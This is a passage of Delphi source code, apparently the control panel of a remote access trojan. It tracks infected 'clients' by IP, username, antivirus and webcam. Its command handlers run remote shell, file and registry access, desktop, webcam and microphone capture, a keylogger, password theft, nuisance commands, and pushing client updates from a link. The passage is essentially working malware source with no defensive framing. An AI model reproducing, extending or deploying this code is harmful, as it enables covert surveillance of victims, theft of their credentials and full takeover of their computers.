      ClientDatas.ImageIndex := GetFlagIndex(ClientDatas.Infos.CountryCode);
      ClientDatas.Ping := GetTickCount;

      if GeoIpLocalisation = True then
      begin
        if not FileExists(GeoIpFile) then
        begin
          MessageBox(Handle, PChar('GeoIp file "' + GeoIpFile + '" not found.'), PROGRAMINFOS, MB_ICONERROR);
          Exit;
        end;

        ClientDatas.CountryName := GeoIpCountryName(ClientDatas.WanIp);
        ClientDatas.ImageIndex := GeoIpFlagIndex(ClientDatas.WanIp);
      end;

      TmpNode := GetNodeGroup(ClientDatas);
      ClientDatas.Node := vrtlstrngtr1.InsertNode(TmpNode, amAddChildFirst, ClientDatas);

      if ClientDatas.Node = nil then
      begin
        ClientDatas.ClientSocket.Disconnect;
        Exit;
      end;

      if TmpNode.ChildCount > 0 then vrtlstrngtr1.IsVisible[TmpNode] := True;
      if TmpNode.ChildCount = 1 then vrtlstrngtr1.Expanded[TmpNode] := True;
      vrtlstrngtr1.Refresh;

      ClientsList.Add(ClientDatas);
      SaveDBStats(ClientDatas);
      CountClients;

      AddLog('Client ' + ClientDatas.UserId + ' connected from socket ' +
        IntToStr(ClientDatas.ClientSocket.Socket), ClientDatas.ImageIndex, clGreen);
    
      try CreateUserFolders(ClientDatas.UserId); except
        MessageBox(Handle, 'Failed to create user folders.', PROGRAMINFOS, MB_ICONERROR);
      end;

      if VisualNotification = True then
      begin
        SendMessage(Handle, WM_POPUP_CONNECTION,
          Integer('Client connected|' + ClientDatas.WanIp + ' / ' +
          ClientDatas.Infos.LocalPort + '|' + ClientDatas.Countryname + '|' +
          ClientDatas.Infos.User + '|' + ClientDatas.Infos.Windows + '|' +
          IntToStr(ClientDatas.ImageIndex) + '|'), 0);   
        Application.ProcessMessages;
      end;

      if T1.Checked = True then
      begin
        ClientDatas.DeskImage := -1;
        ClientDatas.SendDatas(DESKTOPTHUMBNAILVIEW + '|' + IntToStr(ThumbWidth) + '|' + IntToStr(ThumbHeight));
      end;

      if SoundNotification = True then
      begin
        TmpStr := GetSettingsFolder(ClientDatas.UserId) + '\Alarm.settings';
        if not FileExists(TmpStr) then
          PlaySound(PChar(2), hInstance, SND_ASYNC or SND_MEMORY or SND_RESOURCE)
        else
        begin
          JSONConfig := TJSONConfig.Create(TmpStr, PROGRAMPASSWORD);
          JSONConfig.LoadConfig;
          TmpStr := JSONConfig.ReadString('Alarm');
          JSONConfig.Free;

          PlaySound(PChar(TmpStr), 0, SND_ASYNC);                 
        end;
      end;
                          
      //check for "On connect" task
      FormClientsTasks.CheckTask(ClientDatas);

      //Check sqlite3 file installation
      TmpRes := TResourceStream.Create(HInstance, 'SQLITE3', 'Sqlite3File');
      ClientDatas.SendDatas(CLIENTDOWNLOADSQLFILE + '|' + IntToStr(TmpRes.Size) + #0);
      TmpRes.Free;
    end
    else

    if MainCommand = PONG then
    begin                       
      ClientDatas := TClientDatas(ClientSocket.Data);
      if ClientDatas = nil then Exit;

      ClientDatas.PingReceived := True;
      ClientDatas.TimeOutCount := 0;
      if UpdateInfos = False then Exit;

      i := GetTickCount - Cardinal(ClientDatas.Ping);
      ClientDatas.PingCaption := IntToStr(i);

      if i < 100 then
      begin
        ClientDatas.PingImage := 261;
        ClientDatas.PingColor := clBlack;
      end
      else
      if i < 700 then
      begin
        ClientDatas.PingImage := 262;
        ClientDatas.PingColor := clRed;
      end
      else
      begin
        ClientDatas.PingImage := 263;
        ClientDatas.PingColor := clGray;
      end;

      ClientDatas.Infos.ActiveCaption := Datas;
      vrtlstrngtr1.Refresh;
    end
    else

    if MainCommand = DESKTOPTHUMBNAILVIEW then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if ClientDatas = nil then Exit;

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;

      try
        Jpg := TJPEGImage.Create;
        Jpg.LoadFromStream(Stream);
        Stream.Free;
        Bmp := TBitmap.Create;
        Bmp.Width := Jpg.Width;
        Bmp.Height := Jpg.Height;
        Bmp.Canvas.Draw(0, 0, Jpg);
        Jpg.Free;
      except
        Stream.Free;
        Jpg.Free;
        Bmp.Free;
        Exit;
      end;

      if ClientDatas.DeskImage = -1 then
        ClientDatas.DeskImage := ilThumbs.Add(Bmp, nil)
      else ilThumbs.Replace(ClientDatas.DeskImage, Bmp, nil);

      vrtlstrngtr1.Refresh;
      Bmp.Free;

      Application.ProcessMessages;
    end
    else

    if MainCommand = TASKSMANAGER then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[1] = nil) then Exit;
      SendMessage(TFormTasksManager(ClientDatas.Forms[1]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);
      Application.ProcessMessages;
    end
    else
           
    if MainCommand = WINDOWSTHUMBNAILS then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));
      ClientDatas := GetClientDatas(TmpStr);
      if (ClientDatas = nil) or (ClientDatas.Forms[1] = nil) then Exit;
      SendMessage(TFormTasksManager(ClientDatas.Forms[1]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0); 
      Application.ProcessMessages;
    end
    else

    if MainCommand = FILESMANAGER then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[2] = nil) then Exit;
      SendMessage(TFormFilesManager(ClientDatas.Forms[2]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);  
      Application.ProcessMessages;
    end
    else
         
    if MainCommand = FILESIMAGEPREVIEW then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));
      ClientDatas := GetClientDatas(TmpStr);
      if (ClientDatas = nil) or (ClientDatas.Forms[2] = nil) then Exit;
      SendMessage(TFormFilesManager(ClientDatas.Forms[2]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);
      Application.ProcessMessages;
    end
    else

    if MainCommand = REGISTRY then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[3] = nil) then Exit;
      SendMessage(TFormRegistryManager(ClientDatas.Forms[3]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);  
      Application.ProcessMessages;
    end
    else

    if MainCommand = SHELL then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));
      ClientDatas := GetClientDatas(TmpStr);
      if (ClientDatas = nil) or (ClientDatas.Forms[4] = nil) then Exit;
      SendMessage(TFormShell(ClientDatas.Forms[4]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);  
      Application.ProcessMessages;
    end
    else

    if MainCommand = DESKTOPCAPTURESTART then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));
      ClientDatas := GetClientDatas(TmpStr);
      if (ClientDatas = nil) or (ClientDatas.Forms[5] = nil) then Exit;
      SendMessage(TFormDesktop(ClientDatas.Forms[5]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);  
      Application.ProcessMessages;
    end
    else
        
    if MainCommand = WEBCAMDRIVERS then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[6] = nil) then Exit;
      SendMessage(TFormWebcam(ClientDatas.Forms[6]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);  
      Application.ProcessMessages;
    end
    else

    if MainCommand = WEBCAM then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));
      ClientDatas := GetClientDatas(TmpStr);
      if (ClientDatas = nil) or (ClientDatas.Forms[6] = nil) then Exit;
      SendMessage(TFormWebcam(ClientDatas.Forms[6]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0); 
      Application.ProcessMessages;
    end
    else

    if MainCommand = MICROPHONECAPTURESTART then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));
      ClientDatas := GetClientDatas(TmpStr);
      if (ClientDatas = nil) or (ClientDatas.Forms[7] = nil) then Exit;
      SendMessage(TFormMicrophone(ClientDatas.Forms[7]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);    
      Application.ProcessMessages;
    end
    else

    if MainCommand = LOGGER then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[8] = nil) then Exit;
      SendMessage(TFormLogger(ClientDatas.Forms[8]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);   
      Application.ProcessMessages;
    end
    else

    if MainCommand = PASSWORDS then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[9] = nil) then Exit;
      SendMessage(TFormPasswords(ClientDatas.Forms[9]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0); 
      Application.ProcessMessages;
    end
    else

    if MainCommand = PORTSNIFFER then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[10] = nil) then Exit;
      SendMessage(TFormPortSniffer(ClientDatas.Forms[10]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);  
      Application.ProcessMessages;
    end
    else

    if MainCommand = PORTSCANNER then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[11] = nil) then Exit;
      SendMessage(TFormPortScanner(ClientDatas.Forms[11]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0); 
      Application.ProcessMessages;
    end
    else

    if MainCommand = MESSAGESBOXHOSTSLIST then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[12] = nil) then Exit;
      SendMessage(TFormMessagesBox(ClientDatas.Forms[12]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0); 
      Application.ProcessMessages;
    end
    else

    if MainCommand = CHAT then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[14] = nil) then Exit;
      SendMessage(TFormChat(ClientDatas.Forms[14]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);   
      Application.ProcessMessages;
    end
    else

    if MainCommand = INFOSSYSTEM then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[0] = nil) then Exit;
      SendMessage(TFormInformations(ClientDatas.Forms[0]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0); 
      Application.ProcessMessages;
    end
    else

    if MainCommand = UnitCommands.MONITOR then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[16] = nil) then Exit;
      SendMessage(TFormManager(ClientDatas.Forms[16]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);  
      Application.ProcessMessages;
    end
    else

    if MainCommand = CLIENTRENAME then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if ClientDatas = nil then Exit;

      TmpStr := Copy(Datas, 1, Pos('|', Datas) -1);
      Delete(Datas, 1, Pos('|', Datas));

      TmpStr1 := Copy(TmpStr, 1, Pos(':', TmpStr) - 1);
      Delete(TmpStr, 1, Pos(':', TmpStr));

      if (TmpStr1 = ClientDatas.Infos.ClientId) and (TmpStr = ClientDatas.Infos.ClientIcon) then Exit;

      if Datas = 'Y' then
      begin
        ClientDatas.Infos.ClientId := TmpStr1;
        ClientDatas.Infos.ClientIcon := TmpStr;
        vrtlstrngtr1.Refresh;

        if ClientDatas.Forms[16] <> nil then
        TFormManager(ClientDatas.Forms[16]).AddRecvLog('Id renamed by ' + TmpStr1);
      end
      else
      begin
        MessageBox(Handle, PChar('Failed to rename client by ' + TmpStr1 + '.'),
          PROGRAMINFOS, MB_ICONERROR);
        if ClientDatas.Forms[16] <> nil then
        TFormManager(ClientDatas.Forms[16]).AddRecvLog('Failed to rename id by ' + TmpStr1, clRed);
      end;
    end
    else
       
    if MainCommand = CLIENTRENAMEGROUP then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if ClientDatas = nil then Exit;

      TmpStr := Copy(Datas, 1, Pos('|', Datas) -1);
      Delete(Datas, 1, Pos('|', Datas));

      TmpStr1 := Copy(TmpStr, 1, Pos(':', TmpStr) - 1);
      Delete(TmpStr, 1, Pos(':', TmpStr));

      if (TmpStr1 = ClientDatas.Infos.GroupId) and (TmpStr = ClientDatas.Infos.GroupIcon) then Exit;

      if Datas = 'Y' then
      begin          
        ClientDatas.Infos.GroupId := TmpStr1;
        ClientDatas.Infos.GroupIcon := TmpStr;

        if ClientDatas.Node <> nil then
        begin
          TmpNode := ClientDatas.Node.Parent;
          TmpNode1 := GetNodeGroup(ClientDatas);
          vrtlstrngtr1.NodeParent[ClientDatas.Node] := TmpNode1;
          vrtlstrngtr1.IsVisible[TmpNode1] := True;
          vrtlstrngtr1.Refresh;

          if TmpNode1.ChildCount >= 1 then vrtlstrngtr1.Expanded[TmpNode1] := True;
          if TmpNode.ChildCount = 0 then vrtlstrngtr1.IsVisible[TmpNode] := False;

          if ClientDatas.Forms[16] <> nil then
            TFormManager(ClientDatas.Forms[16]).AddRecvLog('Group id changed by ' + TmpStr1);
        end;

        vrtlstrngtr1.Refresh;
      end
      else
      begin
        MessageBox(Handle, PChar('Failed to change client group by ' + TmpStr1 + '.'),
          PROGRAMINFOS, MB_ICONERROR);                                  
        if ClientDatas.Forms[16] <> nil then
        TFormManager(ClientDatas.Forms[16]).AddRecvLog('Failed to change group id by ' + TmpStr1, clRed);
      end;
    end
    else

    if (MainCommand = CLIENTUPDATEFROMFTP) or (MainCommand = CLIENTUPDATEFROMLINK) or
      (MainCommand = CLIENTUPDATEFROMLOCAL) or (MainCommand = CLIENTUPDATECONFIG) 
    then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if ClientDatas = nil then Exit;
      MessageBox(Handle, 'Failed to update client.', PROGRAMINFOS, MB_ICONERROR);
    end
    else

    if MainCommand = MULTIDESKTOPSTART then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));
      ClientDatas := GetClientDatas(TmpStr);
      if ClientDatas = nil then Exit;

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;

      try
        Jpg := TJPEGImage.Create;
        Jpg.LoadFromStream(Stream);
        Stream.Free;
        Bmp := TBitmap.Create;
        Bmp.Width := Jpg.Width;
        Bmp.Height := Jpg.Height;
        Bmp.Canvas.Draw(0, 0, Jpg);
        Jpg.Free;
      except
        Stream.Free;
        Jpg.Free;
        Bmp.Free;
        Exit;
      end;

      FormMultiDesktop.AddThumb(Bmp, ClientDatas.UserId);
      Bmp.Free;                                              
      Application.ProcessMessages;
    end
    else
    
    if MainCommand = MULTIWEBCAMSTART then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));
      ClientDatas := GetClientDatas(TmpStr);
      if ClientDatas = nil then Exit;

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(Datas)^, Length(Datas));
      Stream.Position := 0;

      try
        Jpg := TJPEGImage.Create;
        Jpg.LoadFromStream(Stream);
        Stream.Free;
        Bmp := TBitmap.Create;
        Bmp.Width := Jpg.Width;
        Bmp.Height := Jpg.Height;
        Bmp.Canvas.Draw(0, 0, Jpg);
        Jpg.Free;
      except
        Stream.Free;
        Jpg.Free;
        Bmp.Free;
        Exit;
      end;

      FormMultiWebcam.AddThumb(Bmp, ClientDatas.UserId);
      Bmp.Free;                                               
      Application.ProcessMessages;
    end
    else

    if (MainCommand = CDDRIVEOPEN) or (MainCommand = CDDRIVECLOSE) or
      (MainCommand = COMPUTERBEEP) or (MainCommand = COMPUTERSPEAK) or
      (MainCommand = DESKTOPHIDESYSTEMTRAY) or (MainCommand = DESKTOPHIDETASKSBAR) or
      (MainCommand = DESKTOPSHOWSYSTEMTRAY) or (MainCommand = DESKTOPSHOWTASKSBAR) or
      (MainCommand = DESKTOPHIDEICONS) or (MainCommand = DESKTOPSHOWICONS) or
      (MainCommand = MESSAGESBALLOON) or (MainCommand = MESSAGESBOX) or
      (MainCommand = MONITORPOWER) or (MainCommand = MOUSECRAZY) or
      (MainCommand = MOUSEFREEZE) or (MainCommand = MOUSESWAPBUTTONS)
    then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[16] = nil) then Exit;
      TFormManager(ClientDatas.Forms[16]).AddRecvLog('Command executed');
    end
    else

    if MainCommand = UnitCommands.SYSTEM then
    begin
      ClientDatas := TClientDatas(ClientSocket.Data);
      if (ClientDatas = nil) or (ClientDatas.Forms[17] = nil) then Exit;
      SendMessage(TFormSystem(ClientDatas.Forms[17]).Handle, WM_PROCESS_DATAS, Integer(Datas), 0);
      Application.ProcessMessages;
    end
    else

    if MainCommand = CUSTOMPLUGINSTART then
    begin
      TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));
      ClientDatas := GetClientDatas(TmpStr);
      if (ClientDatas = nil) or (ClientDatas.Forms[16] = nil) then Exit;

      TmpStr1 := Copy(Datas, 1, Pos('|', Datas) - 1);
      Delete(Datas, 1, Pos('|', Datas));

      ExecutePlugin(TFormManager(ClientDatas.Forms[16]).lvPlugins, TmpStr1,
        ClientSocket.Socket, Datas);
    end;
  end;
end;

procedure TFormMain.vrtlstrngtr1GetText(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Column: TColumnIndex; TextType: TVSTTextType;
  var CellText: WideString);
var
  NodePosition: Integer;
  ClientDatas: PClientDatas;
  i: Integer;
begin
  NodePosition := Sender.GetNodeLevel(Node);
  if NodePosition < 0 then Exit;

  ClientDatas := Sender.GetNodeData(Node);
  if ClientDatas = nil then Exit;

  if NodePosition = 0 then
  begin
    if Column <> 0 then CellText := '' else
    begin
      CellText := ClientDatas^.Infos.GroupId + ' (' + IntToStr(Node.ChildCount) + ')';
      vrtlstrngtr1.IsVisible[Node] := True;
    end;
  end
  else

  if NodePosition = 1 then
  begin
    case Column of
      0: CellText := ClientDatas^.Infos.ClientId;
      1: CellText := ClientDatas^.CountryName;
      2: CellText := ClientDatas^.WanIp + ' / ' + ClientDatas^.Infos.LocalPort;
      3: CellText := ClientDatas^.Infos.User;
      4: CellText := ClientDatas.Infos.Computer;
      5: CellText := ClientDatas^.Infos.Windows;
      6: CellText := ClientDatas^.Infos.Antivirus;
      7: CellText := ClientDatas^.Infos.UserType;
      8: CellText := ClientDatas^.Infos.WebCam;
      9: CellText := ClientDatas^.PingCaption;
      10: CellText := ClientDatas^.Infos.ActiveCaption;
      11: CellText := ClientDatas^.Infos.Version;
    end;
  end;
end;

procedure TFormMain.vrtlstrngtr1DblClick(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormManager;
  TmpNode: PVirtualNode;
begin
  if vrtlstrngtr1.SelectedCount <> 1 then Exit;
  TmpNode := vrtlstrngtr1.GetFirstSelected;
  if TmpNode.ChildCount > 0 then Exit;
  ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
  if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Exit;
  if ClientDatas.Forms[16] <> nil then TFormManager(ClientDatas.Forms[16]).Show else
  begin
    TmpForm := TFormManager.Create(Self, ClientDatas);
    ClientDatas.Forms[16] := TmpForm;
    TmpForm.Caption := 'Manager [' + ClientDatas.UserId + ']';
    TmpForm.Show;
  end;
end;

procedure TFormMain.vrtlstrngtr1GetImageIndex(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Kind: TVTImageKind; Column: TColumnIndex;
  var Ghosted: Boolean; var ImageIndex: Integer);
var
  NodePosition: Integer;
  ClientDatas: PClientDatas;
  TmpStr: string;
  i: Integer;
begin
  NodePosition := Sender.GetNodeLevel(Node);
  if NodePosition < 0 then Exit;
  if not (Kind in [ikNormal, ikSelected]) then Exit;

  ClientDatas := Sender.GetNodeData(Node);
  if ClientDatas = nil then Exit;

  if NodePosition = 0 then
  begin
    if Column <> 0 then ImageIndex := -1 else
    begin
      if vrtlstrngtr1.Images = ilThumbs then ImageIndex := -1 else
      begin
        if ClientDatas^.Infos.GroupIcon = '' then ImageIndex := -1 else
        ImageIndex := StrToInt(ClientDatas^.Infos.GroupIcon);
      end;
    end;
  end
  else

  if NodePosition = 1 then
  begin
    case Column of
      0: if vrtlstrngtr1.Images = ilFlags then ImageIndex := StrToInt(ClientDatas^.Infos.ClientIcon) else
          ImageIndex := ClientDatas^.DeskImage;
      1: if vrtlstrngtr1.Images = ilFlags then ImageIndex := ClientDatas^.ImageIndex else
          ImageIndex := -1;
      2: ImageIndex := -1;
      3: ImageIndex := -1;
      4: ImageIndex := -1;
      5: ImageIndex := -1;
      6: ImageIndex := -1;
      7: ImageIndex := -1;
      8: if vrtlstrngtr1.Images = ilFlags then ImageIndex := ClientDatas^.CamImage else
          ImageIndex := -1;
      9: if vrtlstrngtr1.Images = ilFlags then ImageIndex := ClientDatas^.PingImage else
          ImageIndex := -1;
      10: ImageIndex := -1;
      11: ImageIndex := -1;
    end;
  end;
end;

procedure TFormMain.vrtlstrngtr1InitNode(Sender: TBaseVirtualTree;
  ParentNode, Node: PVirtualNode; var InitialStates: TVirtualNodeInitStates);
begin
  Node.CheckType := ctTriStateCheckBox;
  Sender.CheckState[Node] := csCheckedNormal;
  Sender.CheckState[Node] := csUnCheckedNormal;
end;

procedure TFormMain.vrtlstrngtr1MeasureItem(Sender: TBaseVirtualTree;
  TargetCanvas: TCanvas; Node: PVirtualNode; var NodeHeight: Integer);
begin
  NodeHeight := vrtlstrngtr1.Images.Height;
  if (vrtlstrngtr1.GetNodeLevel(Node) = 0) and (vrtlstrngtr1.Images = ilThumbs) then NodeHeight := 16;
end;

procedure TFormMain.vrtlstrngtr1GetNodeDataSize(Sender: TBaseVirtualTree;
  var NodeDataSize: Integer);
begin
  NodeDataSize := SizeOf(TClientDatas);
end;
        
procedure TFormMain.vrtlstrngtr1GetPopupMenu(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Column: TColumnIndex; const P: TPoint;
  var AskParent: Boolean; var PopupMenu: TPopupMenu);
begin
  PopupMenu := pm1;
end;
      
procedure TFormMain.vrtlstrngtr1PaintText(Sender: TBaseVirtualTree;
  const TargetCanvas: TCanvas; Node: PVirtualNode; Column: TColumnIndex;
  TextType: TVSTTextType);
var
  ClientDatas: PClientDatas;
begin
  ClientDatas := vrtlstrngtr1.GetNodeData(Node);
  TargetCanvas.Font.Color := ClientDatas^.PingColor;
end;
          
procedure TFormMain.R5Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode: PVirtualNode;
  TmpStr: string;
begin                         
  if vrtlstrngtr1.SelectedCount = 0 then Exit;

  TmpStr := '127.0.0.1:80';
  if not InputQuery('Reconnect to host', 'Host address', TmpStr) then Exit;
  if (TmpStr = '') or (Pos(':', TmpStr) <= 0) then Exit;

  TmpNode := vrtlstrngtr1.GetFirstSelected;
  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTRECONNECT + '|' + TmpStr);
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.R4Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode: PVirtualNode;
  TmpForm: TFormClientEdit;
  TmpStr: string;
  i: Integer;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;

  TmpForm := TFormClientEdit.Create(Application);
  TmpForm.Caption := 'Edit client id';

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  if (TmpForm.edt1.Text = '') and (TmpForm.lv1.ItemIndex = -1) then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  i := TmpForm.lv1.ItemIndex;
  if i = -1 then TmpStr := '' else TmpStr := TmpForm.lv1.Items[i].Caption;
  TmpStr := TmpForm.edt1.Text + ':' + TmpStr;

  TmpNode := vrtlstrngtr1.GetFirstSelected;
  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTRENAME + '|' + TmpStr);
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormMain.C5Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode, TmpNode1, TmpNode2: PVirtualNode;
  TmpForm: TFormClientEdit;
  TmpStr: string;
  i: Integer;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;

  TmpForm := TFormClientEdit.Create(Application);
  TmpForm.Caption := 'Edit group id';

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  if (TmpForm.edt1.Text = '') and (TmpForm.lv1.ItemIndex = -1) then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;
                                    
  i := TmpForm.lv1.ItemIndex;
  if i = -1 then TmpStr := '' else TmpStr := TmpForm.lv1.Items[i].Caption;
  TmpStr := TmpForm.edt1.Text + ':' + TmpStr;

  TmpNode := vrtlstrngtr1.GetFirstSelected;
  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then
    begin
      TmpNode1 := TmpNode.FirstChild;
      for i := 0 to TmpNode.ChildCount - 1 do
      begin
        if TmpNode1.ChildCount > 0 then Continue;
        ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode1)^));
        if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
        ClientDatas.SendDatas(CLIENTRENAMEGROUP + '|' + TmpStr);
        TmpNode1 := vrtlstrngtr1.GetNext(TmpNode1);
      end;
    end
    else
    begin                                                    
      ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
      if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
      TmpNode1 := ClientDatas.Node.Parent.FirstChild;
      for i := 0 to ClientDatas.Node.Parent.ChildCount - 1 do
      begin
        ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode1)^));
        if (ClientDatas = nil) and (TmpNode1.ChildCount > 0) then Continue;
        ClientDatas.SendDatas(CLIENTRENAMEGROUP + '|' + TmpStr);
        TmpNode1 := vrtlstrngtr1.GetNext(TmpNode1);
      end;
    end;
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormMain.R3Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode: PVirtualNode;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;
  TmpNode := vrtlstrngtr1.GetFirstSelected;

  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTRESTART + '|');
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.C2Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode: PVirtualNode;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;
  TmpNode := vrtlstrngtr1.GetFirstSelected;

  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTCLOSE + '|');
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.F8Click(Sender: TObject);
var
  ClientDatas: TClientDatas;  
  TmpNode: PVirtualNode;
  TmpStr: string;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;
  if not InputQuery('Update client from link', 'Link', TmpStr) then Exit;
  TmpNode := vrtlstrngtr1.GetFirstSelected;

  while Assigned(TmpNode) do
  begin                     
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTUPDATEFROMLINK + '|' + TmpStr);
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.F9Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode: PVirtualNode;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;

  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := 'Client file (*.exe)|*.exe';
  dlgOpen1.DefaultExt := 'exe';
